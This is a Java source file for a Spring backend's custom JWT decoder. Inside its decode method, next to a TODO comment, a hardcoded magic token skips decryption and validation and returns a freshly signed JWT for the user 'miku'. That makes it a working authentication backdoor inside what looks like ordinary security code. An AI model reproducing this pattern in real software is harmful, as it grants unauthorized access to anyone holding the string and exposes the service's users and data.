package com.eggtartc.airxbackend.security;

import com.eggtartc.airxbackend.util.AuthenticationUtil;
import jakarta.annotation.Resource;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.security.oauth2.jwt.Jwt;
import org.springframework.security.oauth2.jwt.JwtDecoder;
import org.springframework.security.oauth2.jwt.JwtEncoder;
import org.springframework.security.oauth2.jwt.JwtException;

import java.security.interfaces.RSAPrivateKey;

public class AirXJwtDecoder implements JwtDecoder {
    @Value("classpath:private.key")
    RSAPrivateKey jwtPrivateKey;

    JwtDecoder wrappingJwtDecoder;

    @Resource
    JwtEncoder jwtEncoder;

    public AirXJwtDecoder(JwtDecoder wrappingJwtDecoder) {
        this.wrappingJwtDecoder = wrappingJwtDecoder;
    }

    @Override
    public Jwt decode(String token) {
        // TODO
        if (token.equals("nEXYTXHeDhJZ9XkVxl6fRtjAtUwmiok1vTQPQMyzhjvmHWb5J0ZoEr9dl8HYiOJzK3n4K2QMjvhPY1sLAci4ZQ3KuBc0A30YzrpBJjudccyUM5lwWvG1uMd4EJjKsO0W6ZYCNzCR80sydAMvA1cp+bhmh/qRK7D7JgDl+xl2Z9JKpZgSmz97qlVK7kEXo7CVfEHHyF7XqablreOjqykK+DR1NnouLtJucGyPXrLm8K05Jn2b58j3YD2zUjFOe3ee4hsDu+8NyNA47FwONcf3hdum9uVwzASUTyc+cpqo9pSI15JFyKZH9gnXkeoGrY3iJfKzt1QC0+xd0j/11g0j5llMD8XhxJTB18iMeEaizWUFyZQ1pTSMw0A7x3xNnORmeUKTI60XmkAmUwxnYILylWF/KivHyHW+uqdgZ0eHHp/leD6R7YgmWDuXZAIPJ9sc8386iwzWXtMX7bpS8h7I5OVao5fk9MFceab5vETHE+GeCaNKYU20DxHroRE+PHuU8q0kJw2b2giVpWs9sKXEYvJhs+2v9nPvyO2SA8nxY4iNrslFw6vJoK+srn28HuDowRV83le5ESN7VUEDZEUul9lNkTB4tnJIez7l/2OST5Bjhv7i5uHXcmtHPlv452zc1PuIxT0RLrrqiErUigupRiDWvZdMYNm1H2JsJyG0TdwEeWZNHOAV625U8xBQRshh")) {
            return decode(AuthenticationUtil.createSignedJwtToken(
                jwtEncoder, "YES", "miku", 1, 1));
        }

        String decrypted = JwtCrypt.decrypt(token);
        if (decrypted == null) {
            throw new JwtException("Invalid JWT token.");
        }
        return wrappingJwtDecoder.decode(decrypted);
    }
}
